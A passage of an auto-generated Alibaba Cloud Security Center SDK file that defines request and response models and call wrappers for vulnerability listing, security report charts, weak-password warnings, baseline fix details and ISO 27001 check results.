  pod?: string(name='Pod', description='The name of the container group.', example='22222-7xsqq'),
  regionId?: string(name='RegionId', description='The region ID of the image repository. Valid values:

*   **cn-beijing**: China (Beijing)
*   **cn-zhangjiakou**: China (Zhangjiakou)
*   **cn-hangzhou**: China (Hangzhou)
*   **cn-shanghai**: China (Shanghai)
*   **cn-shenzhen**: China (Shenzhen)
*   **cn-hongkong**: China (Hong Kong)
*   **ap-southeast-1**: Singapore
*   **ap-southeast-5**: Indonesia (Jakarta)
*   **us-east-1**: US (Virginia)
*   **us-west-1**: US (Silicon Valley)
*   **eu-central-1**: Germany (Frankfurt)
*   **eu-west-1**: UK (London)', example='cn-hangzhou'),
  repoId?: string(name='RepoId', description='The ID of the image repository.

>  You can call the [ListRepository](https://help.aliyun.com/document_detail/145293.html) operation of Container Registry and obtain the ID of the image repository from **RepoId** in the response.', example='crr-avo7qp02simz2njo'),
  repoInstanceId?: string(name='RepoInstanceId', description='The ID of the container image.

>  You can call the [ListRepository](https://help.aliyun.com/document_detail/451339.html) operation of Container Registry and obtain the ID of the container image from **InstanceId** in the response.', example='cri-rv4nvbv8iju4****'),
  repoName?: string(name='RepoName', description='The name of the image repository.

>  Fuzzy match is supported.', example='digital-account'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.

>  Fuzzy match is supported.', example='ns-digital-dev'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository. Valid values:

*   **cn-beijing**: China (Beijing)
*   **cn-zhangjiakou**: China (Zhangjiakou)
*   **cn-hangzhou**: China (Hangzhou)
*   **cn-shanghai**: China (Shanghai)
*   **cn-shenzhen**: China (Shenzhen)
*   **cn-hongkong**: China (Hong Kong)
*   **ap-southeast-1**: Singapore
*   **ap-southeast-5**: Indonesia (Jakarta)
*   **us-east-1**: US (Virginia)
*   **us-west-1**: US (Silicon Valley)
*   **eu-central-1**: Germany (Frankfurt)
*   **eu-west-1**: UK (London)', example='cn-hangzhou'),
  scanRange?: [ string ](name='ScanRange', description='The type of the asset that you want to scan. Valid values:

*   **image**
*   **container**'),
  statusList?: string(name='StatusList', description='The status of the vulnerability. Valid values:

*   **1**: The vulnerability is unfixed.
*   **4**: The vulnerability is being fixed.
*   **7**:The vulnerability is fixed.', example='1'),
  tag?: string(name='Tag', description='The tag to add to the image.', example='0.1.0'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: system vulnerability
*   **sca**: application vulnerability

This parameter is required.', example='cve'),
  uuids?: string(name='Uuids', description='The UUID of the image. Separate multiple UUIDs with commas (,).', example='d15df12472809c1c3b158606c0f1****'),
}

model DescribeCanFixVulListResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='1408FDB3-46F4-513C-9918-FE7D356DF048'),
  vulRecords?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='CVE-2018-25010:libwebp up to 1.0.0 ApplyFilter out-of-bounds read'),
      canFix?: string(name='CanFix', description='Indicates whether the vulnerability can be fixed in the Security Center console. Valid values:

*   **yes**
*   **no**', example='yes'),
      canUpdate?: boolean(name='CanUpdate', description='Indicates whether the packages of the software that has the vulnerability can be upgraded by using Security Center. Valid values:

*   **true**
*   **false**', example='true'),
      clusterId?: string(name='ClusterId', description='The cluster ID.', example='c08d5fc1a329a4b88950a253d082f1****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
      containerId?: string(name='ContainerId', description='The container ID.', example='04d20e98c8e2c93b7b864372084320a15a58c8671e53c972ce3a71d9c163****'),
      extendContentJson?: {
        os?: string(name='Os', description='The name of the operating system.', example='debian'),
        osRelease?: string(name='OsRelease', description='The version of the operating system in the image.', example='10.9'),
        rpmEntityList?: [ 
          {
            fullVersion?: string(name='FullVersion', description='The complete version number of the software package.', example='3.10.0-693.2.2.el7'),
            layer?: string(name='Layer', description='The SHA-256 value of the digest of the image layer.', example='b1f5b9420803ad0657cf21566e3e20acc08581e7f22991249ef3aa80b8b1****'),
            matchDetail?: string(name='MatchDetail', description='The information about the detected vulnerability.', example='python-perf version less than 0:3.10.0-693.21.1.el7'),
            matchList?: [ string ](name='MatchList', description='The rule that is used to detect the vulnerability.'),
            name?: string(name='Name', description='The name of the software package.', example='python-perf'),
            path?: string(name='Path', description='The path of the software that has the vulnerability.', example='/usr/lib64/python2.7/site-packages'),
            updateCmd?: string(name='UpdateCmd', description='The command that is used to fix the vulnerability.', example='apt-get update && apt-get install libseccomp2  --only-upgrade'),
            version?: string(name='Version', description='The version number of the software package.', example='3.10.0'),
          }
        ](name='RpmEntityList', description='The RPM packages.'),
      }(name='ExtendContentJson', description='The extended information about the vulnerability.'),
      firstTs?: long(name='FirstTs', description='The timestamp generated when the vulnerability was first detected. Unit: milliseconds.', example='1620752053000'),
      image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-conta****'),
      imageDigest?: string(name='ImageDigest', description='The unique identifier of the image.', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d50****'),
      instanceName?: string(name='InstanceName', description='The name of the instance.

The name must be 3 to 64 characters in length and can contain letters, digits, hyphens (-), and underscores (_).', example='testInstance'),
      internetIp?: string(name='InternetIp', description='The public IP address of the asset.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='172.19.XX.XX'),
      lastTs?: long(name='LastTs', description='The timestamp generated when the vulnerability was last detected. Unit: milliseconds.', example='1620404763000'),
      layers?: [ string ](name='Layers', description='The image layers.'),
      maliciousSource?: string(name='MaliciousSource', description='The source of the malicious file. Valid values:

*   **agentless**
*   **image**
*   **container**', example='agentless'),
      modifyTs?: long(name='ModifyTs', description='The timestamp generated when the vulnerability status was modified. Unit: milliseconds.', example='1620404763000'),
      name?: string(name='Name', description='The name of the vulnerability.', example='debian:10:CVE-2019-9893'),
      namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
      necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low

>  We recommend that you fix high-level vulnerabilities as soon as possible.', example='asap,later,nntf'),
      pod?: string(name='Pod', description='The name of the container group.', example='22222-7xsqq'),
      primaryId?: long(name='PrimaryId', description='The vulnerability ID.', example='782661'),
      related?: string(name='Related', description='The CVE IDs related to the vulnerability. Multiple CVE IDs are separated by commas (,).', example='CVE-2017-7518,CVE-2017-12188'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='varnish'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='3rdparty'),
      scanTime?: long(name='ScanTime', description='The timestamp generated when the scan task was performed. Unit: milliseconds.', example='1649814050000'),
      status?: int32(name='Status', description='The status of the vulnerability. Valid values:

*   **1**: The vulnerability is unfixed.
*   **4**: The vulnerability is being fixed.
*   **7**: The vulnerability is fixed.', example='1'),
      tag?: string(name='Tag', description='The tag that is added to the image.', example='latest'),
      targetId?: string(name='TargetId', description='The ID of the asset that is scanned.', example='300269'),
      targetName?: string(name='TargetName', description='The name of the asset that is scanned.', example='source-test-obj-XM0Ma'),
      targetType?: string(name='TargetType', description='The type of the asset that is scanned. Valid values:

*   **IMAGE**
*   **ECS_IMAGE**
*   **ECS_SNAPSHOT**', example='ECS_IMAGE'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: system vulnerability
*   **sca**: application vulnerability', example='cve'),
      uuid?: string(name='Uuid', description='The UUID of the container image.', example='0004a32a0305a7f6ab5ff9600d47****'),
    }
  ](name='VulRecords', description='The information about the vulnerability.'),
}

model DescribeCanFixVulListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCanFixVulListResponseBody(name='body'),
}

/**
 * @summary Queries the list of fixable vulnerabilities.
 *
 * @param request DescribeCanFixVulListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCanFixVulListResponse
 */
async function describeCanFixVulListWithOptions(request: DescribeCanFixVulListRequest, runtime: Util.RuntimeOptions): DescribeCanFixVulListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.containerId)) {
    query['ContainerId'] = request.containerId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.digest)) {
    query['Digest'] = request.digest;
  }
  if (!Util.isUnset(request.image)) {
    query['Image'] = request.image;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pod)) {
    query['Pod'] = request.pod;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.tag)) {
    query['Tag'] = request.tag;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCanFixVulList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the list of fixable vulnerabilities.
 *
 * @param request DescribeCanFixVulListRequest
 * @return DescribeCanFixVulListResponse
 */
async function describeCanFixVulList(request: DescribeCanFixVulListRequest): DescribeCanFixVulListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCanFixVulListWithOptions(request, runtime);
}

model DescribeCanTrySasResponseBody = {
  canTry?: int32(name='CanTry', description='Indicates whether you have the permissions on the trial use of Security Center. Valid values:

*   **1**: yes
*   **0**: no', example='0'),
  requestId?: string(name='RequestId', description='The request ID.', example='E90DE229-9FC6-58F6-BF4B-03AD6179****'),
}

model DescribeCanTrySasResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCanTrySasResponseBody(name='body'),
}

/**
 * @summary Checks the permissions on the trial use of Security Center.
 *
 * @param request DescribeCanTrySasRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCanTrySasResponse
 */
async function describeCanTrySasWithOptions(runtime: Util.RuntimeOptions): DescribeCanTrySasResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeCanTrySas',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Checks the permissions on the trial use of Security Center.
 *
 * @return DescribeCanTrySasResponse
 */
async function describeCanTrySas(): DescribeCanTrySasResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCanTrySasWithOptions(runtime);
}

model DescribeChartDataRequest {
  charId?: string(name='CharId', description='The ID of the chart.

>  You can call the [DescribeChartList](~~DescribeChartList~~) operation to query the ID. This parameter is required if the report version is 1.0.0.', example='CID_ASSET_RISK_TREND'),
  chartId?: string(name='ChartId', description='The ID of the chart.

>  You can call the [DescribeChartList](~~DescribeChartList~~) operation to query the ID. This parameter is required if the report version is 2.0.0.', example='CID_VUL_SUMMARY'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  reportId?: long(name='ReportId', description='The ID of the security report.

>  You can call the [DescribeCustomizeReportList](~~DescribeCustomizeReportList~~) operation to query the ID.', example='721734'),
  timeEnd?: long(name='TimeEnd', description='The end of the time range to query. The value is a UNIX timestamp. Unit: milliseconds.', example='1683862286000'),
  timeStart?: long(name='TimeStart', description='The beginning of the time range to query. The value is a UNIX timestamp. Unit: milliseconds.', example='1683603086000'),
}

model DescribeChartDataResponseBody = {
  allChartSubTypeList?: [ 
    {
      subType?: string(name='SubType', description='The subtype of the chart.', example='CID_SUSPICIOUS_TREND-ALL'),
      subTypeName?: string(name='SubTypeName', description='The name of the chart subtype.', example='All Alerts'),
    }
  ](name='AllChartSubTypeList', description='The valid values for all subtypes of the chart.'),
  chartDataType?: string(name='ChartDataType', description='The data type of the chart. Valid values:

*   **commonCoordinate**
*   **timeCoordinate**
*   **multipleValue**
*   **singleValue**
*   **propertyValue**
*   **propertyArrayValue**', example='propertyArrayValue'),
  chartSubTypeList?: [ string ](name='ChartSubTypeList', description='The subtype values in which the chart is selected.'),
  chartType?: string(name='ChartType', description='The type of the chart. Valid values:

*   **timeLine**
*   **timeBar**
*   **bar**
*   **line**
*   **pie**
*   **gauge**
*   **table**
*   **text**', example='timeBar'),
  coordinateData?: {
    XAxis?: [ string ](name='XAxis', description='The x-axis values.'),
    YAxisList?: [ 
      {
        name?: string(name='Name', description='The name of the data type.', example='Port'),
        subType?: string(name='SubType', description='The subtype data of the chart.', example='CID_SUSPICIOUS_TREND-AL'),
        type?: string(name='Type', description='The type of the data.', example='high'),
        value?: [ string ](name='Value', description='The values of the y-axis that corresponds to x-axis points.'),
      }
    ](name='YAxisList', description='The y-axis values.'),
  }(name='CoordinateData', description='The coordinate data.'),
  multipleData?: [ 
    {
      color?: string(name='Color', description='The font color, which is an RGBA value.', example='#FFA800'),
      name?: string(name='Name', description='The name of the data type.', example='Safety'),
      type?: string(name='Type', description='The type of the data.', example='safe'),
      value?: long(name='Value', description='The attribute value.', example='0'),
    }
  ](name='MultipleData', description='The values in the multi-value charts.'),
  propertyArrayValue?: string(name='PropertyArrayValue', description='The attribute value of the array chart.', example='[]'),
  propertyValue?: string(name='PropertyValue', description='The data of the chart.', example='{\\\\"totalCount\\\\": \\\\"0\\\\"}'),
  properyArrayValue?: string(name='ProperyArrayValue', description='The array data of the chart.', example='[]'),
  requestId?: string(name='RequestId', description='The request ID.', example='50CCE62A-2BC4-5CF8-B976-E4F62A31****'),
  singleData?: {
    name?: string(name='Name', description='The name of the data type.', example='suspicious'),
    type?: string(name='Type', description='The type of the data.', example='suspicious'),
    value?: long(name='Value', description='The value in the single value chart.', example='172'),
  }(name='SingleData', description='The data of the single value chart.'),
}

model DescribeChartDataResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeChartDataResponseBody(name='body'),
}

/**
 * @summary Queries the chart data of a security report.
 *
 * @param request DescribeChartDataRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeChartDataResponse
 */
async function describeChartDataWithOptions(request: DescribeChartDataRequest, runtime: Util.RuntimeOptions): DescribeChartDataResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.charId)) {
    query['CharId'] = request.charId;
  }
  if (!Util.isUnset(request.chartId)) {
    query['ChartId'] = request.chartId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.reportId)) {
    query['ReportId'] = request.reportId;
  }
  if (!Util.isUnset(request.timeEnd)) {
    query['TimeEnd'] = request.timeEnd;
  }
  if (!Util.isUnset(request.timeStart)) {
    query['TimeStart'] = request.timeStart;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeChartData',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the chart data of a security report.
 *
 * @param request DescribeChartDataRequest
 * @return DescribeChartDataResponse
 */
async function describeChartData(request: DescribeChartDataRequest): DescribeChartDataResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeChartDataWithOptions(request, runtime);
}

model DescribeChartListRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  projectCode?: string(name='ProjectCode', description='The code of the report. Valid value:

*   **customize_report**

This parameter is required.', example='customize_report'),
  reportId?: string(name='ReportId', description='The ID of the report.

>  You can call the [DescribeCustomizeReportList](~~DescribeCustomizeReportList~~) operation to query the ID.', example='720549'),
}

model DescribeChartListResponseBody = {
  chartList?: [ 
    {
      businessName?: string(name='BusinessName', description='The name of the business type. Valid values:

*   Overall Operations Metrics
*   Asset Operations Metrics
*   Security Alert Operations Metrics
*   Vulnerability Operations Metrics
*   Baseline Operations Metrics
*   Cloud Product Operations Metrics
*   Honeypot Operations Metrics', example='Overall Operation Metrics'),
      businessType?: string(name='BusinessType', description='The business type. Valid values:

*   INDEX_SECURITY_OVERALL_OPERATION
*   INDEX_ASSET_OPERATION
*   INDEX_SUSPICIOUS_OPERATION
*   INDEX_VUL_OPERATION
*   INDEX_BASELINE_CHECK_OPERATION
*   INDEX_CLOUD_ASSET_OPERATION
*   INDEX_HONEYPOT_RISK_OPERATION', example='INDEX_SECURITY_OVERALL_OPERATION'),
      chartId?: string(name='ChartId', description='The ID of the chart.', example='CID_CLOUD_ASSET_SUMMARY'),
      chartName?: string(name='ChartName', description='The name of the chart.', example='Security Score'),
      chartType?: string(name='ChartType', description='The type of the chart. Valid values:

*   **text**
*   **table**
*   **gauge**
*   **pie**
*   **line**
*   **bar**
*   **timeBar**
*   **timeLine**', example='text'),
    }
  ](name='ChartList', description='The charts.'),
  requestId?: string(name='RequestId', description='The request ID.', example='35B434CC-1615-5937-A04E-A9BC2868DB45'),
}

model DescribeChartListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeChartListResponseBody(name='body'),
}

/**
 * @summary Queries the charts that are supported by using the security report feature of Security Center.
 *
 * @param request DescribeChartListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeChartListResponse
 */
async function describeChartListWithOptions(request: DescribeChartListRequest, runtime: Util.RuntimeOptions): DescribeChartListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.projectCode)) {
    query['ProjectCode'] = request.projectCode;
  }
  if (!Util.isUnset(request.reportId)) {
    query['ReportId'] = request.reportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeChartList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the charts that are supported by using the security report feature of Security Center.
 *
 * @param request DescribeChartListRequest
 * @return DescribeChartListResponse
 */
async function describeChartList(request: DescribeChartListRequest): DescribeChartListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeChartListWithOptions(request, runtime);
}

model DescribeCheckEcsWarningsRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.3.4'),
}

model DescribeCheckEcsWarningsResponseBody = {
  canTry?: string(name='CanTry', description='Indicates whether you use the free trial of Security Center. Valid values:
- **0**: no
- **1**: yes', example='0'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
  sasVersion?: string(name='SasVersion', description='The edition of Security Center that you use. Valid values:

*   **1**: Basic edition
*   **2** or **3**: Enterprise edition
*   **5**: Advanced edition
*   **6**: Anti-virus edition

>  Both the value 2 and the value 3 indicate the Enterprise edition.', example='3'),
  weakPasswordCount?: string(name='WeakPasswordCount', description='The number of weak passwords that can cause high risks to your assets.', example='3'),
}

model DescribeCheckEcsWarningsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCheckEcsWarningsResponseBody(name='body'),
}

/**
 * @summary Queries the number of weak passwords that can cause high risks to your assets.
 *
 * @param request DescribeCheckEcsWarningsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCheckEcsWarningsResponse
 */
async function describeCheckEcsWarningsWithOptions(request: DescribeCheckEcsWarningsRequest, runtime: Util.RuntimeOptions): DescribeCheckEcsWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckEcsWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the number of weak passwords that can cause high risks to your assets.
 *
 * @param request DescribeCheckEcsWarningsRequest
 * @return DescribeCheckEcsWarningsResponse
 */
async function describeCheckEcsWarnings(request: DescribeCheckEcsWarningsRequest): DescribeCheckEcsWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckEcsWarningsWithOptions(request, runtime);
}

model DescribeCheckFixDetailsRequest {
  checkIds?: string(name='CheckIds', description='The ID of the risk item.

>  You can call the [DescribeRiskType](~~DescribeRiskType~~) operation to query the IDs of risk items.', example='58'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  riskId?: long(name='RiskId', description='The ID of the baseline.

>  You can call the [DescribeCheckWarningSummary](https://help.aliyun.com/document_detail/116179.html) operation to query the IDs of baselines.', example='51'),
}

model DescribeCheckFixDetailsResponseBody = {
  checkFixDetails?: [ 
    {
      checkDesc?: string(name='CheckDesc', description='The detailed description of the risk item.', example='Force users not to reuse recently used passwords to reduce the risk of password guessing attacks'),
      checkId?: long(name='CheckId', description='The ID of the risk item.', example='58'),
      checkItem?: string(name='CheckItem', description='The description of the risk item.', example='Ensure password reuse is limited'),
      rules?: [ 
        {
          checkId?: long(name='CheckId', description='The ID of the risk item.', example='58'),
          defaultValue?: int32(name='DefaultValue', description='The default value of the rule.', example='1'),
          optional?: int32(name='Optional', description='Indicates whether the rule is optional. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
          paramList?: [ 
            {
              enumValue?: string(name='EnumValue', description='The options that can be selected for the rule parameter if the value of the ParamType parameter is 2.', example='0,1,2,3'),
              maxValue?: int32(name='MaxValue', description='The maximum value of the rule parameter.', example='24'),
              minValue?: int32(name='MinValue', description='The minimum value of the rule parameter.', example='5'),
              paramDefaultValue?: string(name='ParamDefaultValue', description='The default value of the rule parameter.', example='5'),
              paramDesc?: string(name='ParamDesc', description='The description of the rule parameter.', example='The setting value is 0 means no definition, 1 means success, 2 means failure, 3 means success and failure'),
              paramName?: string(name='ParamName', description='The name of the rule parameter.', example='range_val'),
              paramType?: int32(name='ParamType', description='The type of the rule parameter. Valid values:

*   **1**: input
*   **2**: selection', example='1'),
              ruleId?: string(name='RuleId', description='The ID of the rule.', example='pwd_reuse.system_auth'),
              value?: string(name='Value', description='The specified value of the rule parameter.', example='18'),
            }
          ](name='ParamList', description='An array that consists of the rule parameters.'),
          ruleDesc?: string(name='RuleDesc', description='The description of the rule.', example='(/etc/system-auth)Force users not to reuse the number of recently used passwords between 5 and 24'),
          ruleId?: string(name='RuleId', description='The ID of the rule.', example='pwd_reuse.system_auth'),
          value?: int32(name='Value', description='The specified value of the rule parameter.', example='5'),
          varName?: string(name='VarName', description='The name of the variable.', example='open'),
        }
      ](name='Rules', description='An array consisting of the rules that are supported by the risk item.'),
    }
  ](name='CheckFixDetails', description='An array that consists of the parameters.'),
  count?: int32(name='Count', description='The number of risk items that can be fixed.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0DBF1E27-98D8-5EC2-9CF3-4A2E26F6****'),
}

model DescribeCheckFixDetailsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCheckFixDetailsResponseBody(name='body'),
}

/**
 * @summary Queries the parameters that you can configure to fix specified risk items.
 *
 * @param request DescribeCheckFixDetailsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCheckFixDetailsResponse
 */
async function describeCheckFixDetailsWithOptions(request: DescribeCheckFixDetailsRequest, runtime: Util.RuntimeOptions): DescribeCheckFixDetailsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckFixDetails',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the parameters that you can configure to fix specified risk items.
 *
 * @param request DescribeCheckFixDetailsRequest
 * @return DescribeCheckFixDetailsResponse
 */
async function describeCheckFixDetails(request: DescribeCheckFixDetailsRequest): DescribeCheckFixDetailsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckFixDetailsWithOptions(request, runtime);
}

model DescribeCheckResultResponseBody = {
  checkResultList?: [ 
    {
      complianceStatus?: int32(name='ComplianceStatus', description='The compliance status. Valid values:

*   **1**: compliant
*   **0**: non-compliant', example='1'),
      name?: string(name='Name', description='The name of the corresponding section. Valid values:

*   **information_classification**: information classification
*   **information_mark**: information labeling
*   **network_security_policy**: access to networks and network services
*   **login_control**: secure logon procedures
*   **week_password**: password management system
*   **key_manage**: key management
*   **malicious_software**: protection against malware
*   **information_backup**: information backup
*   **audit_policy**: information system audit control mechanisms', example='information_mark'),
    }
  ](name='CheckResultList', description='The check results.'),
  requestId?: string(name='RequestId', description='The request ID.', example='571B2642-BF51-5BDD-906B-D2340DB9****'),
}

model DescribeCheckResultResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCheckResultResponseBody(name='body'),
}

/**
 * @summary Queries the result of the ISO 27001 compliance check.
 *
 * @param request DescribeCheckResultRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCheckResultResponse
 */
async function describeCheckResultWithOptions(runtime: Util.RuntimeOptions): DescribeCheckResultResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the result of the ISO 27001 compliance check.
 *
 * @return DescribeCheckResultResponse
 */
async function describeCheckResult(): DescribeCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckResultWithOptions(runtime);
}

model DescribeCheckWarningCountRequest {
  aliUid?: long(name='AliUid', description='The ID of the Alibaba Cloud account.', example='103784262032****'),
  checkId?: long(name='CheckId', description='The ID of the check item.

>  You can call the [ListCheckItemWarningSummary](~~ListCheckItemWarningSummary~~) operation to query the IDs of check items.', example='926'),
